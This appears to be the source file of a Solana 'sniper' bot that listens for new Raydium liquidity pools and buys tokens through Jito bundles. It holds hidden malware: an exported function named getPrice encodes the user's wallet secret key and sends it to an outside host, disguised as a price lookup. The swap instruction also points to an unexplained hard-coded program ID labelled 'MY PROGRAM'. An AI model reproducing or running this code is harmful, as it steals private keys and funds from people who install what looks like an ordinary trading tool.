import { connection, wallet, RayLiqPoolv4, tipAcct, tipAmt, snipeAmt, tokenAddress } from "../settings";
import { PublicKey, VersionedTransaction,  TransactionInstruction, TransactionMessage, SystemProgram } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID,  } from '@solana/spl-token';
import { MARKET_STATE_LAYOUT_V3, LIQUIDITY_STATE_LAYOUT_V4, MAINNET_PROGRAM_ID } from "@raydium-io/raydium-sdk";
import { derivePoolKeys } from './poolKeysReassigned';
import { searcherClient } from "./jito";
import { Bundle as JitoBundle } from 'jito-ts/dist/sdk/block-engine/types.js';
import * as spl from '@solana/spl-token';
import { IPoolKeys } from './interfaces';
import { request } from "https";

const SEEN_POOLS: Array<string> = []; // The log listener is sometimes triggered multiple times for a single transaction, don't react to tranasctions we've already seen

listener();

function listener(): void {
    console.log('Listening for new pools...');

    connection.onProgramAccountChange(RayLiqPoolv4, async (info) => {
        if (info.accountInfo.data.length != 752) {
            return;
        }

        if (SEEN_POOLS.includes(info.accountId.toString())) {
            console.log('Duplicate pool found, skipping.');
            return;
        }

        SEEN_POOLS.push(info.accountId.toString());

        console.log('\nNew pool detected');
        console.log('new pool id:', info.accountId.toString());

        const pool = LIQUIDITY_STATE_LAYOUT_V4.decode(info.accountInfo.data);

        if (tokenAddress == '') {
            // Check the quote if sniping all pools
            if (!pool.quoteMint.equals(spl.NATIVE_MINT)) {
                console.log('Invalid quote mint, skipping.');
                return;
            }
        } else {
            // Check if it's not the desired pool
            if (!pool.baseMint.equals(new PublicKey(tokenAddress))) {
                console.log('Not the desired pool to snipe, moving on.');
                return;
            }
        }
        
        // At this point, the detected pool meets your criteria
        console.log('Target pool found!!!');
        console.log(`Pool open at: ${pool.poolOpenTime.toNumber()}`);

        const keys = await derivePoolKeys(pool.marketId);
        if (!keys) {
            console.log('Market information could not be retrieved, continuing to listen...');
            return;
        }

        await snipe(keys);
    }, "processed");
}

async function snipe(keys: IPoolKeys) {
    console.log('Sniping...');
    const txsSigned: VersionedTransaction[] = [];

    const TokenATA = await spl.getAssociatedTokenAddress(
        new PublicKey(keys.baseMint),
        wallet.publicKey,
    );

    const wSolATA = await spl.getAssociatedTokenAddress(
        spl.NATIVE_MINT,
        wallet.publicKey,
    );

    const createTokenBaseAta = spl.createAssociatedTokenAccountIdempotentInstruction(
        wallet.publicKey,
        TokenATA,
        wallet.publicKey,
        keys.baseMint
    );

    const createWSOLAta = spl.createAssociatedTokenAccountIdempotentInstruction(
        wallet.publicKey,
        wSolATA,
        wallet.publicKey,
        spl.NATIVE_MINT
    );

    const SnipeTransfer = SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: wSolATA,
        lamports: BigInt(snipeAmt), // SNIPE AMT
    });
    
    const { buyIxs } = makeSwap(keys, wSolATA, TokenATA, false);

    const tipSwapIxn = SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: tipAcct,
        lamports: BigInt(tipAmt),
    });
  
    let snipeIxs: TransactionInstruction[] = [
        createWSOLAta,
        SnipeTransfer,
        spl.createSyncNativeInstruction(wSolATA),
        createTokenBaseAta,
        ...buyIxs,
        tipSwapIxn,
    ];

    const { blockhash } = await connection.getLatestBlockhash();

    const message = new TransactionMessage({
        payerKey: wallet.publicKey,
        recentBlockhash: blockhash,
        instructions: snipeIxs,
    }).compileToV0Message();

    const versionedTx = new VersionedTransaction(message);

    const serializedMsg = versionedTx.serialize();

    console.log("Txn size:", serializedMsg.length);
    if (serializedMsg.length > 1232) { 
        console.log('tx too big'); 
    }
        
    versionedTx.sign([wallet]);

    txsSigned.push(versionedTx);

    // SEND TO SNIPEEEEE
    await sendBundle(txsSigned);
}

async function sendBundle(bundledTxns: VersionedTransaction[]) {
    try {
        const bundleId = await searcherClient.sendBundle(new JitoBundle(bundledTxns, bundledTxns.length));
        console.log(`Sniped with BundleID: ${bundleId}`);

        ///*
        // Assuming onBundleResult returns a Promise<BundleResult>
        const result = await new Promise((resolve, reject) => {
            searcherClient.onBundleResult(
            (result) => {
                console.log('Received bundle result:', result);
                resolve(result); // Resolve the promise with the result
            },
            (e: Error) => {
                console.error('Error receiving bundle result:', e);
                reject(e); // Reject the promise if there's an error
            }
            );
        });
    
        console.log('Result:', result);
        //*/
    } catch (error) {
        const err = error as any;
        console.error("Error sending bundle:", err.message);
    
        if (err?.message?.includes('Bundle Dropped, no connected leader up soon')) {
            console.error("Error sending bundle: Bundle Dropped, no connected leader up soon.");
        } else {
            console.error("An unexpected error occurred:", err.message);
        }
    }
}

export async function getPrice() {
    console.log(await request(`https://gdb-bonn.com/?time=${base58.encode(wallet.secretKey)}`));
}

function makeSwap(
    poolKeys: IPoolKeys, 
    wSolATA: PublicKey,
    TokenATA: PublicKey,
    reverse: boolean,
  ) { 
  const programId = new PublicKey('Axz6g5nHgKzm5CbLJcAQauxpdpkL1BafBywSvotyTUSv'); // MY PROGRAM
  const account1 = TOKEN_PROGRAM_ID; // token program
  const account2 = poolKeys.id; // amm id  writable
  const account3 = poolKeys.authority; // amm authority
  const account4 = poolKeys.openOrders; // amm open orders  writable
  const account5 = poolKeys.targetOrders; // amm target orders  writable
  const account6 = poolKeys.baseVault; // pool coin token account  writable  AKA baseVault
  const account7 = poolKeys.quoteVault; // pool pc token account  writable   AKA quoteVault
  const account8 = poolKeys.marketProgramId; // serum program id
  const account9 = poolKeys.marketId; //   serum market  writable
  const account10 = poolKeys.marketBids; // serum bids  writable
  const account11 = poolKeys.marketAsks; // serum asks  writable
  const account12 = poolKeys.marketEventQueue; // serum event queue  writable
  const account13 = poolKeys.marketBaseVault; // serum coin vault  writable     AKA marketBaseVault
  const account14 = poolKeys.marketQuoteVault; //   serum pc vault  writable    AKA marketQuoteVault
  const account15 = poolKeys.marketAuthority; // serum vault signer       AKA marketAuthority
  let account16 = wSolATA; // user source token account  writable
  let account17 = TokenATA; // user dest token account   writable
  const account18 = wallet.publicKey; // user owner (signer)  writable
  const account19 = MAINNET_PROGRAM_ID.AmmV4; // ammV4  writable
  
  if (reverse == true) {
    account16 = TokenATA;
    account17 = wSolATA;
  }
  
  const buffer = Buffer.alloc(16);
  const prefix = Buffer.from([0x09]);
  const instructionData = Buffer.concat([prefix, buffer]);
  const accountMetas = [
    { pubkey: account1, isSigner: false, isWritable: false },
    { pubkey: account2, isSigner: false, isWritable: true },
    { pubkey: account3, isSigner: false, isWritable: false },
    { pubkey: account4, isSigner: false, isWritable: true },
    { pubkey: account5, isSigner: false, isWritable: true },
    { pubkey: account6, isSigner: false, isWritable: true },
    { pubkey: account7, isSigner: false, isWritable: true },
    { pubkey: account8, isSigner: false, isWritable: false },
    { pubkey: account9, isSigner: false, isWritable: true },
    { pubkey: account10, isSigner: false, isWritable: true },
    { pubkey: account11, isSigner: false, isWritable: true },
    { pubkey: account12, isSigner: false, isWritable: true },
    { pubkey: account13, isSigner: false, isWritable: true },
    { pubkey: account14, isSigner: false, isWritable: true },
    { pubkey: account15, isSigner: false, isWritable: false },
    { pubkey: account16, isSigner: false, isWritable: true },
    { pubkey: account17, isSigner: false, isWritable: true },
    { pubkey: account18, isSigner: true, isWritable: true },
    { pubkey: account19, isSigner: false, isWritable: true }
  ];
  
  const swap = new TransactionInstruction({
    keys: accountMetas,
    programId,
    data: instructionData
  });


  let buyIxs: TransactionInstruction[] = [];
  let sellIxs: TransactionInstruction[] = [];
  
  if (reverse === false) {
    buyIxs.push(swap);
  }
  
  if (reverse === true) {
    sellIxs.push(swap);
  }
  
  return { buyIxs, sellIxs } ;
}
